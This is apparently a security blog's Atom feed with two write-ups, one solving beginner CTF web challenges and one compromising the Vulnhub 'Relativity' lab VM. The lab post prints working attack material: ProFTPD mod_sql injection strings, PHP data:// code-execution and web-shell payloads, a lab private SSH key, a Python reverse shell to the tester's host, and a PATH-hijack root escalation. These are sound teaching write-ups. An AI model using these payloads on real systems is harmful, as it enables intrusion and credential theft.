<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2015-06-16T19:07:36+03:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Infosec Institute n00bs CTF Labs]]></title>
    <link href="http://chousensha.github.io/blog/2015/06/05/infosec-institute-n00bs-ctf-labs/"/>
    <updated>2015-06-05T20:39:07+03:00</updated>
    <id>http://chousensha.github.io/blog/2015/06/05/infosec-institute-n00bs-ctf-labs</id>
    <content type="html"><![CDATA[<p>It&rsquo;s been a while since I&rsquo;ve last polished my web hacking skills, and I recently found out about these CTF challenges. Too late for the bounty though..</p>

<p>You can access the labs at <a href="http://ctf.infosecinstitute.com/index.php">http://ctf.infosecinstitute.com/index.php</a></p>

<!-- more -->


<h3>Level 1</h3>

<p>This is straightforward, just listen to Yoda:</p>

<p><img class="center" src="/images/infosec_institute_ctf/level1.png" title="&lsquo;level1&rsquo; &lsquo;level1&rsquo;" ></p>

<p>You can find the flag in the source: <code>infosec_flagis_welcome</code></p>

<h3>Level 2</h3>

<p><img class="center" src="/images/infosec_institute_ctf/level2.png" title="&lsquo;level2&rsquo; &lsquo;level2&rsquo;" ></p>

<p>Found the image in the source:</p>

<p><code>html
&lt;img src="img/leveltwo.jpeg" /&gt;
</code>
When clicking on it, there is this error:</p>

<p><code>The image â€œview-source:<a href="http://ctf.infosecinstitute.com/img/leveltwo.jpeg%E2%80%9D">http://ctf.infosecinstitute.com/img/leveltwo.jpeg%E2%80%9D</a> cannot be displayed because it contains errors.</code></p>

<p>Downloaded it and ran <em>strings</em> on it:</p>

<p><code>plain
root@kali:~/Desktop# strings leveltwo.jpeg
aW5mb3NlY19mbGFnaXNfd2VhcmVqdXN0c3RhcnRpbmc=
</code></p>

<p>Well, well. This isn&rsquo;t suspicious at all! :D After you Base64 decode it, you get the flag: <code>infosec_flagis_wearejuststarting</code></p>

<h3>Level 3</h3>

<p><img class="center" src="/images/infosec_institute_ctf/level3.png" title="&lsquo;level3&rsquo; &lsquo;level3&rsquo;" ></p>

<p>I used an <a href="http://www.onlinebarcodereader.com/">online barcode scanner</a> that produced this output: <code>.. &ndash;. ..&ndash;. &mdash;&ndash; &hellip; . &ndash;.&ndash;. ..&ndash;. .&ndash;.. .&ndash; &mdash;. .. &hellip; &mdash; &mdash;&ndash; .&ndash;. &hellip; .. &ndash;. &mdash;.</code>. Well, that seems familiar..Morse code! Used <a href="http://www.onlineconversion.com/morse_code.htm">this site</a> to decode it: <code>INFOSECFLAGISMORSING</code></p>

<h3>Level 4</h3>

<p><img class="center" src="/images/infosec_institute_ctf/level4.png" title="&lsquo;level4&rsquo; &lsquo;level4&rsquo;" ></p>

<p>If you hover over the image with your mouse, a popup appears with the message <em>Stop poking me!</em>. Looking in the source, the Javascript function responsible for that is called <code>poke()</code>, and you can find it in the <code>custom.js</code> file. All it does is alert the message. I spent some time here going in a wrong direction, disabling Javascript, and trying to see if something is hidden in the image. The hint states HTTP, and I did look at the headers and all, and it&rsquo;s not often that you see a cookie called <em>fusrodah</em>. But initially I didn&rsquo;t think it was pertaining to this specific level, because it was present in the requests to other levels as well. But when I hit a blank on everything else, I returned to it and ran it in some decoders:</p>

<p><code>plain
fusrodah=vasbfrp_syntvf_jrybirpbbxvrf
</code></p>

<p>And I hit the jackpot with a Caesar shift of 13: <code>infosec_flagis_welovecookies</code></p>

<h3>Level 5</h3>

<p>When you click on Level 5, you immediatelly get a popup saying <em>Hacker!!!</em>. I disabled Javascript to see this image:</p>

<p><img class="center" src="/images/infosec_institute_ctf/level5.png" title="&lsquo;level5&rsquo; &lsquo;level5&rsquo;" ></p>

<p>Right, back to the thing I hate most, steganography. Stegdetect didn&rsquo;t find anything, and I didn&rsquo;t have any luck with StegExpose either. Surprisingly, an online tool came to help: <a href="https://futureboy.us/stegano/decinput.html">https://futureboy.us/stegano/decinput.html</a></p>

<p>The output was this string:</p>

<p><code>plain
01101001011011100110011001101111011100110110010101100011010111110110011001101100011000010110011101101001011100110101111101110011011101000110010101100111011000010110110001101001011001010110111001110011
</code></p>

<p>which I then ran in a binary decoder: <code>infosec_flagis_stegaliens</code></p>

<h3>Level 6</h3>

<p><img class="center" src="/images/infosec_institute_ctf/level6.png" title="&lsquo;level6&rsquo; &lsquo;level6&rsquo;" ></p>

<p>Packet analysis is not really my thing, so the way I solved this was by just following streams until I hit on something potentially interesting: the string <code>696e666f7365635f666c616769735f736e6966666564</code>, contained in the first UDP packet, with a source and destination of 127.0.0.1. This was actually the hex encoded flag: <code>infosec_flagis_sniffed</code></p>

<h3>Level 7</h3>

<p><img class="center" src="/images/infosec_institute_ctf/level7.png" title="&lsquo;level7&rsquo; &lsquo;level7&rsquo;" ></p>

<p>I tried to manually navigate to levelseven.php and all I got was a blank page. But when I looked at the request with Live HTTP Headers, I noticed this: <code>HTTP/1.0 200 aW5mb3NlY19mbGFnaXNfeW91Zm91bmRpdA==</code>. A base64 encoded string&hellip;and decoding it gives the flag: <code>infosec_flagis_youfoundit</code></p>

<h3>Level 8</h3>

<p><img class="center" src="/images/infosec_institute_ctf/level8.png" title="&lsquo;level8&rsquo; &lsquo;level8&rsquo;" ></p>

<p>Well, didn&rsquo;t expect to solve it just by running <em>strings</em>, but that&rsquo;s all you need to do! :D The flag is in the <em>strings</em> output: <code>infosec_flagis_0x1a</code></p>

<h3>Level 9</h3>

<p><img class="center" src="/images/infosec_institute_ctf/level9.png" title="&lsquo;level9&rsquo; &lsquo;level9&rsquo;" ></p>

<p>No SQLi involved here..so I googled for Cisco IDS Web Login System password. Eventually I found the credentials that work on <a href="http://www.anameless.com/blog/default-passwords.html">this page</a> that contains default passwords for a number of devices. The ones that worked were <code>root:attack</code>. A popup appeared with the flag <code>ssaptluafed_sigalf_cesofni</code>, which is the reverse for <code>infosec_flagis_defaultpass</code></p>

<h3>Level 10</h3>

<p><img class="center" src="/images/infosec_institute_ctf/level10.png" title="&lsquo;level10&rsquo; &lsquo;level10&rsquo;" ></p>

<p>Played the .wav file, it sounded like something being fast forwarded. So I launched Audacity, and under Effect->Change Speed, you can play with the Speed Multiplier (some 0.20 and lower) until you hear a voice telling you the flag: <code>infosec_flagis_sound</code></p>

<h3>Level 11</h3>

<p><img class="center" src="/images/infosec_institute_ctf/level11.png" title="&lsquo;level11&rsquo; &lsquo;level11&rsquo;" ></p>

<p>Right, that huge PHP image is suspicious. I downloaded it and ran <em>strings</em> on it to begin with, and:</p>

<p><code>plain
infosec_flagis_aHR0cDovL3d3dy5yb2xsZXJza2kuY28udWsvaW1hZ2VzYi9wb3dlcnNsaWRlX2xvZ29fbGFyZ2UuZ2lm
</code></p>

<p>Base64? Yes it is! Decoding it gives the address of another image: <a href="http://www.rollerski.co.uk/imagesb/powerslide_logo_large.gif">http://www.rollerski.co.uk/imagesb/powerslide_logo_large.gif</a></p>

<p><img class="center" src="/images/infosec_institute_ctf/powerslide.png" title="&lsquo;powerslide&rsquo; &lsquo;powerslide&rsquo;" ></p>

<p>Couldn&rsquo;t find anything hidden in this image, so I guess <code>infosec_flagis_powerslide</code></p>

<h3>Level 12</h3>

<p><img class="center" src="/images/infosec_institute_ctf/level12.png" title="&lsquo;level12&rsquo; &lsquo;level12&rsquo;" ></p>

<p>Spent some time scratching my head at this one, because I couldn&rsquo;t find anything. Since I was just jumping over the initial section of the page source, with the CSS files and all, I was missing the relevant information. So, if you look in the source and you compare it with other pages, you can see that there is a new CSS file, called <em>design.css</em>, with the following inside:</p>

<p>``` css
.thisloveis{</p>

<pre><code>color: #696e666f7365635f666c616769735f686579696d6e6f7461636f6c6f72;
</code></pre>

<p>}
```</p>

<p>And if you decode that hex string, you get the flag: <code>infosec_flagis_heyimnotacolor</code></p>

<h3>Level 13</h3>

<p><img class="center" src="/images/infosec_institute_ctf/level13.png" title="&lsquo;level13&rsquo; &lsquo;level13&rsquo;" ></p>

<p>I kept trying editing the URL and adding file extensions commonly associated with backup files from <a href="http://www.file-extensions.org/filetype/extension/name/backup-files">this list</a>. Eventually, stumbled upon one that works: the <em>.old</em> file extension.</p>

<p><a href="http://file.org/extension/old">What is an OLD file?</a>:</p>

<blockquote><p>Files that contain the .old file extension are most commonly used to indicate that a file on a user&rsquo;s hard drive is a backup copy of a newer
version of the file. The .old extension is given to the file name when the newer version of the file is saved within the associated computer
application.</p>

<p>The initial file extension is often kept intact when the .old file extension is assigned to a file. For example, if the original version of a file
is saved as mydocument.doc, then when a new version of the file is created that version will also be saved with the name of mydocument.doc.
However, in order to store a copy of the old version of the file, the original version will be saved with the name as mydocument.doc.old.</p></blockquote>

<p>So when I added <em>.old</em> to the URL, I got a message if I want to open or download levelthirteen.php.old. Ok, now we&rsquo;re getting somewhere! Ran <em>strings</em> on it (again!) and noticed an extra something in the source:</p>

<p>``` html
/* <img src="img/clippy1.jpg" class="imahe" /> <br /> <br /></p>

<pre><code>&lt;p&gt;Do you want to download this mysterious file?&lt;/p&gt;
&lt;a href="misc/imadecoy"&gt;
  &lt;button class="btn"&gt;Yes&lt;/button&gt;
&lt;/a&gt;
&lt;a href="index.php"&gt;
  &lt;button class="btn"&gt;No&lt;/button&gt;
&lt;/a&gt;
*/
</code></pre>

<p>```</p>

<p>I went to <a href="http://ctf.infosecinstitute.com/misc/imadecoy">http://ctf.infosecinstitute.com/misc/imadecoy</a> and you can download the mysterious file. Apparently it&rsquo;s another job for Wireshark:</p>

<p><code>plain
root@kali:~/Desktop# file imadecoy
imadecoy: tcpdump capture file (little-endian) - version 2.4 (Linux "cooked", capture length 65535)
</code></p>

<p>Ok, more random following streams and trying to glean what&rsquo;s interesting. Eventually, I reached this part:</p>

<p><img class="center" src="/images/infosec_institute_ctf/imadecoy.png" title="&lsquo;imadecoy&rsquo; &lsquo;imadecoy&rsquo;" ></p>

<p>The GET request for that HoneyPY.PNG image occurs a few times after first spotting it. So the image might be interesting. And it&rsquo;s possible to reconstruct it from the packet file! Click on the relevant packet:</p>

<p><code>plain
633 46.399534   127.0.0.1   127.0.0.1   HTTP    1955    HTTP/1.1 200 OK  (PNG)
</code></p>

<p>Then go to File->Export Objects->HTTP. Wireshark will then give you all the HTTP objects list:</p>

<p><img class="center" src="/images/infosec_institute_ctf/http_objects.png" title="&lsquo;http object list&rsquo; &lsquo;http objects&rsquo;" ></p>

<p>We&rsquo;re only interested in the image, which is the last one. I saved it, and&hellip;</p>

<p><img class="center" src="/images/infosec_institute_ctf/flag13.png" title="&lsquo;flag13&rsquo; &lsquo;flag13&rsquo;" ></p>

<h3>Level 14</h3>

<p><img class="center" src="/images/infosec_institute_ctf/level14.png" title="&lsquo;level14&rsquo; &lsquo;level14&rsquo;" ></p>

<p>The file is a phpMyAdmin SQL Dump. If you scroll through it, towards the end there will be this table:</p>

<p>``` plain</p>

<h2>&mdash; Dumping data for table <code>friends</code></h2>

<p>INSERT INTO <code>friends</code> (<code>id</code>, <code>name</code>, <code>address</code>, <code>status</code>) VALUES
(102, &lsquo;Sasha Grey&rsquo;, &lsquo;Vatican City&rsquo;, &lsquo;Active&rsquo;),
(101, &lsquo;Andres Bonifacio&rsquo;, &lsquo;Tondo, Manila&rsquo;, &lsquo;Active&rsquo;),
(103, &lsquo;lol&rsquo;, &lsquo;what the???&rsquo;, &lsquo;Inactive&rsquo;),
(104, &lsquo;\u0069\u006e\u0066\u006f\u0073\u0065\u0063\u005f\u0066\u006c\u0061\u0067\u0069\u0073\u005f\u0077\u0068\u0061\u0074\u0073\u006f\u0072\u0063\u0065\u0072\u0079\u0069\u0073\u0074\u0068\u0069\u0073&rsquo;, &lsquo;annoying&rsquo;, &lsquo;0x0a&rsquo;);
```</p>

<p>Used <a href="http://ddecode.com/hexdecoder/">this decoder</a> to decode the not-at-all conspicuous string and: <code>infosec_flagis_whatsorceryisthis</code> ! :D</p>

<h3>Level 15</h3>

<p>Something seems wrong with the server and I get a (real) 404 error for this level only. When it works again I will update this section</p>

<p><img class="center" src="/images/infosec_institute_ctf/cookie.png" title="&lsquo;cookie&rsquo; &lsquo;cookie&rsquo;" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Relativity]]></title>
    <link href="http://chousensha.github.io/blog/2015/05/10/pentest-lab-relativity/"/>
    <updated>2015-05-10T16:40:50+03:00</updated>
    <id>http://chousensha.github.io/blog/2015/05/10/pentest-lab-relativity</id>
    <content type="html"><![CDATA[<p>I selected the Relativity VM from Vulnhub as my next home lab target. The objective is to read <code>/root/flag.txt</code>. Let&rsquo;s get started!</p>

<!-- more -->


<p>``` plain
 nmap -A -p1-65535 192.168.80.128</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-05-10 16:46 EEST
Nmap scan report for 192.168.80.128
Host is up (0.00058s latency).
Not shown: 65532 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp
22/tcp open  ssh     OpenSSH 5.9 (protocol 2.0)
| ssh-hostkey:
|   1024 42:d0:50:45:6c:4f:6a:25:d9:5e:d4:7d:12:26:04:ef (DSA)
|<em>  2048 1b:e9:72:2b:8a:0b:57:0a:4b:ad:3d:06:62:94:29:02 (RSA)
80/tcp open  http    Apache httpd 2.2.23 ((Fedora))
|</em>http-title: M.C. Escher &ndash; Relativity
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="http://www.insecure.org/cgi-bin/servicefp-submit.cgi">http://www.insecure.org/cgi-bin/servicefp-submit.cgi</a> :
SF-Port21-TCP:V=6.47%I=7%D=5/10%Time=554F618E%P=x86_64-unknown-linux-gnu%r
SF:(GenericLines,29,&ldquo;220\x20Welcome\x20to\x20Relativity\x20FTP\x20(mod_sq
SF:l)\r\n&rdquo;);
MAC Address: 00:0C:29:9F:1D:0E (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 &ndash; 3.10
Network Distance: 1 hop
Service Info: Host: Relativity
```</p>

<p>The web server doesn&rsquo;t seem to serve anything else than an image. I ran Nikto and Dirbuster on it but didn&rsquo;t find anything. Next I hit the FTP server. No anonymous login possible, but there was something interesting in the banner:</p>

<p><code>plain
220 Welcome to Relativity FTP (mod_sql)
</code></p>

<p>I started googling, and it turns out that <a href="http://www.proftpd.org/docs/contrib/mod_sql.html">&ldquo;The mod_sql module is an authentication and logging module for ProFTPD&rdquo;</a>. The good news is, <a href="https://www.rapid7.com/db/vulnerabilities/ftp-proftpd-sql-injection">there is a SQLi vulnerability</a> in the USER command that might allow access to the server. I don&rsquo;t know the version of our target server, but let&rsquo;s try it!</p>

<p>On <a href="http://www.securityfocus.com/bid/33722/exploit">http://www.securityfocus.com/bid/33722/exploit</a> you can find some sample exploit strings:</p>

<p>``` plain
username: %&lsquo;) and 1=2 union select 1,1,uid,gid,homedir,shell from users; &mdash;
password: 1</p>

<p>username: %&lsquo;) and 1=2 union (select &lt;name&gt;,1,&lt;uid&gt;,&lt;gid&gt;,0x2F,0x2F62696E2F62617368); &mdash; a
```</p>

<p>Neither worked, but I tinkered with the comment characters and found out that I could get in either by replacing the <em>&mdash;</em> with a <em>#</em>, or by inserting a space and random characters after the <em>&mdash;</em>:</p>

<p><code>plain
220 Welcome to Relativity FTP (mod_sql)
Name (192.168.80.128:root): username: %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; #
331 Password required for username:.
Password:
230 User username: %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; # logged in.
Remote system type is UNIX.
Using binary mode to transfer files.
</code></p>

<p>Next, I found out an interesting looking directory:</p>

<p><code>plain
ftp&gt; pwd
257 "/" is current directory.
ftp&gt; dir
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 root     root         4096 Mar  5  2013 0f756638e0737f4a0de1c53bf8937a08
-rw-r--r--   1 root     root       235423 Mar  5  2013 artwork.jpg
-rw-r--r--   1 root     root          130 Mar  5  2013 index.html
226 Transfer complete.
</code></p>

<p>It seems we are in the root directory, but the html and image file hint at the web server. So I went to the website again and this time I tried to navigate to that new directory:</p>

<p><img class="center" src="/images/pentest/relativity/secretdir.png" title="&lsquo;secretdir&rsquo; &lsquo;secretdir&rsquo;" ></p>

<p>I looked around at the pages, noticed the URL when accessing them looks something like this: <code><a href="http://192.168.80.128/0f756638e0737f4a0de1c53bf8937a08/index.php?page=escher.php">http://192.168.80.128/0f756638e0737f4a0de1c53bf8937a08/index.php?page=escher.php</a></code>. So I tried some local file inclusion, but it didn&rsquo;t get me anywhere. To get to the next step, I needed some external reading and inspiration. For the exploit, we can leverage PHP&rsquo;s <a href="http://php.net/manual/en/wrappers.php">stream wrappers</a>: PHP comes with many built-in wrappers for various URL-style protocols for use with the filesystem functions such as fopen(), copy(), file_exists() and filesize(). On <a href="https://www.idontplaydarts.com/2011/03/php-remote-file-inclusion-command-shell-using-data-stream/">this blog post</a> there is a nice explanation and examples of how to get remote code execution by leveraging the <a href="http://php.net/manual/en/wrappers.data.php">data stream</a>. If you look at the examples, you can see that the content passed as a base64 string is being interpreted.
Check page 9 of <a href="https://www.imperva.com/docs/HII_Remote_and_Local_File_Inclusion_Vulnerabilities.pdf">this pdf</a> for a summary of this remote file inclusion technique. Bottom line: we can base64 encode PHP commands and feed them to the target. So to test this out:</p>

<p>``` plain</p>

<h1>simple RFI</h1>

<p>page=data://text/plain, &lt;?php system(&ldquo;whoami&rdquo;);?></p>

<h1>base64 encoded RFI</h1>

<p>page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTs/Pg==</p>

<h1>mini shell</h1>

<p>page=data://text/plain,&lt;?php system($_GET[cmd]);?>&amp;cmd=id</p>

<h1>base64 + URL encoded mini shell (didn&rsquo;t work without URL encoding)</h1>

<p>page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8%2B&amp;cmd=id
```</p>

<p>And we are free to enumerate! Next thing I did was to read <em>/etc/passwd</em> (look at it in the source code of the page for better readability). This gave me the name of 2 users on the machine:</p>

<h2>``` plain</h2>

<p>mauk:x:1001:1001::/home/mauk:/bin/bash
jetta:x:1002:1002::/home/jetta:/bin/bash
```</p>

<p>Next I looked around some more, and when listing the home directories, I noticed that mauk&rsquo;s home folder permissions aren&rsquo;t what they should be (but good for us!):</p>

<p><code>plain
drwx------. 3 jetta jetta 4096 Jul  9  2013 jetta
drwxr-xr-x. 3 mauk  mauk  4096 Jul  9  2013 mauk
</code></p>

<p>Looking in mauk&rsquo;s directory, this is interesting:</p>

<p><code>
drwxr-xr-x. 2 mauk mauk 4096 Jul  9  2013 .ssh
</code></p>

<p>Even better, inside there is mauk&rsquo;s private SSH key!</p>

<p>``` plain
-rw-r&mdash;r&mdash;. 1 mauk mauk 1679 Feb 24  2013 id_rsa</p>

<p>```</p>

<p>And we can read it:</p>

<p><code>plain
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA5sm/rHHoCaTtncp7DCSIJlWnUg9eyfpJ3czIn18U1lv5ZQf0
9yGaDxafualdpXCNMo32mVQb9XQ7c2N7sdSdAjsgSjV0YG/IZGZNRyFS58YJQRdZ
5wRu6eKAlQVss/Lq3zwuBsT8Om/1/cKpVgB3ukPtKA97M5iSxL1VWWXg6GVoJ6f6
zIio/DZMFCxOU9Wyl7i8ssEoBxQlmgZh9pnYYhwo7Rf3RXBJeHDpuc1g+vol2vRN
ALXqIBlItS08MhoTaS0SK+pD98OU34M745U5Mo4TgFjYc+eD7xewyduWuS5IuFPd
xfcHkt0cQ7he0AYHuk5ooCI4ca3B0xcSZILWqwIDAQABAoIBAHNnIMxXLQNdkGAd
tsfMoLQikodrHif7WuJpG0zuG5pQ5XWKtAi7qbCvzHDnaudmT4SfDld/gneLhord
jSXQPi62aCATeL0cSGVD7pKJ7E3vbgM5bQAi7F9RnqBl1QRqjN3R1uYVrFaAU85v
f4N8umHOw5ELpLyZJ5LvZfVNB1jNIRpxINhAP+/kVslsZ93qyssljokKFMy/uOIH
r+SV3b3Zfogvg67AJ/g08jtCjYdbr7egPP2TYPMRz5fbTWCrc5m4EBvf5h5pP/w6
Go12YacY2lbF5wzbFUjIdNyF7RZHFDbSB0bM9aCDmXTfywlFswYdb7HyIZrstQ9W
BzWhIYkCgYEA/tUe/rhUcEYEXkhddkXWARcX0t9YNb8apY7WyVibiSyzh33mscRG
MLZoJJri5QMvNdYkNGr5zSGEo270Q2CzduKCbhVjXIybIbmggAc/80gZ5E8FDgJ7
szUKJL37BxXbAAYFIZkzXvc76Ve+vZvLfKMTbQqXTgKkQpGyRHLVOz8CgYEA59ht
YicNlz2yM26mpGqQNLGtEC1RmyZbPn03yJRTBJG5/sOlMw0RI+cMEiqyo7MKHmMZ
+Z7VKVtk8xEQbUy6EAeeSri/Fh1xiKRtlwwQSU1q2ooPOmdHyUp+rhseoPaDAJgy
3KJYbkQMzHVt6KhsWVTEnrz0VtxiTzRu7p2Y5ZUCgYEAt5X2RG+rdU8b6oibvI9H
Q3XNlf+NXvsUSV2EY33QX5yyodQUFNFf98wRbv2epHoM0u45GwJOgHe7RLq0gq3x
3J4GdSQ3dv9c64j9lf6jFbNF4/MBozwqvcpiSmILrOkT4wpzO+dQ2QOoR80M/zB0
ApDBd/b/VhYVHFg2Y5WPBKUCgYBn47SIMgXGCtBqeZ/UtyetZRyuzg/uXQ6v/r5b
dBOLTZ2xyouhR66xjtv63AU2k4jqOvAtyf2szZZ70N6yi5ooirFkvEpsJ39zgnLV
J4O4xScnjIvsWNFzIp2HeQGNkUj8oDbSZTEJIBc4GzrH8Yizsud0VimLLrAi29UF
ubsEzQKBgQDpWaD5rTcaWueiH2DwI7kbdgyf6yfpunsRNsnq0GqZ2wSaUyKt9b1j
bj9Dp+VxrUt584v//7z9Skkde2akJbA/qiF8/oOvzaiNRAOfpLCiqoL0vJ5dIvcg
aXwuOk5Dt0/xQWPAKHL6HYyzQjnad/VAmn6tnxko1A/S8ELiG+MUtg==
-----END RSA PRIVATE KEY-----
</code></p>

<p>We can save this private key on our machine and use it to log in as mauk! After looking around without any major discoveries, I noticed this folder in <em>/opt/</em>:</p>

<p><code>plain
[mauk@Relativity ~]$ ls -l /opt
total 4
drwx------ 13 jetta jetta 4096 May 20 18:32 Unreal
</code></p>

<p>That means there is an Unreal IRCd server there! But I didn&rsquo;t find one when port scanning. Looking at the listening programs, there is indeed an IRC server listening on localhost on port 6667:</p>

<p><code>plain
[mauk@Relativity ~]$ netstat -lntp
(No info could be read for "-p": geteuid()=1001 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:6667          0.0.0.0:*               LISTEN      -                   
...
</code></p>

<p>The ircd server might be an avenue for privilege escalation to jetta:</p>

<p><code>plain
[mauk@Relativity ~]$ ps -u jetta
  PID TTY          TIME CMD
  557 ?        00:00:00 ircd
</code></p>

<p>But there was no netcat installed on the machine, so to find some information about the irc server, I set up SSH port forwarding so I can access it from my machine:</p>

<p><code>plain
root@kali:~# ssh -L 4444:127.0.0.1:6667 mauk@192.168.80.128
Last login: Sat May 23 18:25:04 2015 from 192.168.80.130
[mauk@Relativity ~]$
</code></p>

<p>And now I could port scan my local 4444 port to learn more:</p>

<p>``` plain
root@kali:~# nmap -A -sV 127.0.0.1 4444</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-05-23 16:31 EEST
setup_target: failed to determine route to 4444 (0.0.17.92)
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000065s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
4444/tcp open  irc     Unreal ircd
| irc-info:
|   server: relativity.localdomain
|   version: Unreal3.2.8.1. relativity.localdomain
|   servers: 1
|   users: 1
|   lservers: 0
|   lusers: 1
|   uptime: 0 days, 0:51:08
|   source host: rox-D2735CD4
|_  source ident: nmap
```</p>

<p>I googled the version and it contains a backdoor, and there is a Metasploit module for it. I fired up Metasploit and used against my localhost and port (remember the port forwarding), and got a shell as jetta! But if you want to know more about the backdoor and how to exploit it manually, read <a href="http://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html">this</a>.</p>

<p>``` plain
msf exploit(unreal_ircd_3281_backdoor) > run</p>

<p>[<em>] Started reverse handler on 192.168.80.130:5555
[</em>] Connected to 127.0.0.1:4444&hellip;</p>

<pre><code>:relativity.localdomain NOTICE AUTH :*** Looking up your hostname...
</code></pre>

<p>[<em>] Sending backdoor command&hellip;
[</em>] Command shell session 1 opened (192.168.80.130:5555 &ndash;> 192.168.80.128:41061) at 2015-05-23 17:18:12 +0300</p>

<p>whoami
jetta
```</p>

<p>In jetta&rsquo;s home directory there is a directory named <code>auth_server</code> with a binary inside. I ran <em>strings</em> on it:</p>

<p><code>plain
strings /home/jetta/auth_server/auth_server
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
fflush
puts
putchar
printf
poll
stdout
system
__libc_start_main
GLIBC_2.2.5
l$ L
t$(L
|$0H
[+] Checking Certificates...
done
[+] Contacting server, please wait...
could not establish connection
invalid certificates
error: (12)
fortune -s | /usr/bin/cowsay
Starting Auth server..
;*3$"
</code></p>

<p>Interesting. This binary also appears to be owned as root:</p>

<p><code>plain
ls -l /home/jetta/auth_server/auth_server
-rwxr-xr-x 1 root root 8010 Mar  8  2013 /home/jetta/auth_server/auth_server
</code></p>

<p>I tried to <em>sudo -l</em> to see if jetta can run any commands as root, but there was no output in my shell. So I checked if the shell I have is interactive using <a href="http://unix.stackexchange.com/questions/26676/how-to-check-if-a-shell-is-login-interactive-batch">this SO post</a>:</p>

<p><code>plain
[[ $- == *i* ]] &amp;&amp; echo 'Interactive' || echo 'Not interactive'
Not interactive
</code></p>

<p>I then read <a href="http://netsec.ws/?p=337">this post</a> about spawning a TTY shell and used the first of the choices for a proper shell:</p>

<p>``` plain
python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;
sh-4.2$ sudo -l
sudo -l
Matching Defaults entries for jetta on this host:</p>

<pre><code>requiretty, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
XAUTHORITY PATH", env_reset
</code></pre>

<p>User jetta may run the following commands on this host:</p>

<pre><code>(root) NOPASSWD: /home/jetta/auth_server/auth_server
</code></pre>

<p>```</p>

<p>Excellent, so the key to getting root is in exploiting that binary we found earlier. I ran it to see what it does:</p>

<p>``` plain
sh-4.2$ /home/jetta/auth_server/auth_server
/home/jetta/auth_server/auth_server
[+] Checking Certificates&hellip;done
[+] Contacting server, please wait&hellip;could not establish connection
error: (12)</p>

<hr />

<p>&lt; There isn&rsquo;t any problem ></p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>

<p>I ran it several times for fun, made a mental note to replace my fortune cookies at the end of the blog posts with cowsay fortune cookies because this is purely awesome, then looked at <em>strings</em> again. Looking at the line <code>fortune -s | /usr/bin/cowsay</code>, we see that the <em>fortune</em> command doesn&rsquo;t use an absolute path. So we can create a program of our choosing called fortune and modify our PATH variable to start looking in the location of our program. At this point I tried several ways to get a local or reverse root shell but I kept getting errors that the fortune file is busy, so instead of running the exploit every time and then getting a TTY shell on top of it, I thought maybe I can log in directly as jetta now and work from there. So I made a <code>.ssh</code> directory inside jetta&rsquo;s home folder and copied there mauk&rsquo;s <code>authorized_keys</code> file (remember the permissions were too lax). So now I could directly ssh as jetta and try again for the shell.</p>

<p>This time I used a <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Python reverse shell</a>:</p>

<p><code>plain
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.80.130",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
</code>
I updated it with my host address and port, put it in a file named fortune, gave it permissions and updated  the  path to start looking in <em>/tmp/</em>:</p>

<p>``` plain</p>

<p>[jetta@Relativity ~]$ chmod 777 /tmp/fortune</p>

<p>[jetta@Relativity ~]$ export PATH=&ldquo;/tmp:$PATH&rdquo;</p>

<p>[jetta@Relativity ~]$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/jetta/.local/bin:/home/jetta/bin
```</p>

<p>On my machine I had netcat listen for connections:</p>

<p><code>plain
root@kali:~# nc -vnlp 5555
nc: listening on :: 5555 ...
nc: listening on 0.0.0.0 5555 ...
</code></p>

<p>And now I ran <code>auth_server</code> again:</p>

<p><code>plain
[jetta@Relativity ~]$ sudo /home/jetta/auth_server/auth_server
[+] Checking Certificates...done
[+] Contacting server, please wait...could not establish connection
error: (12)
</code></p>

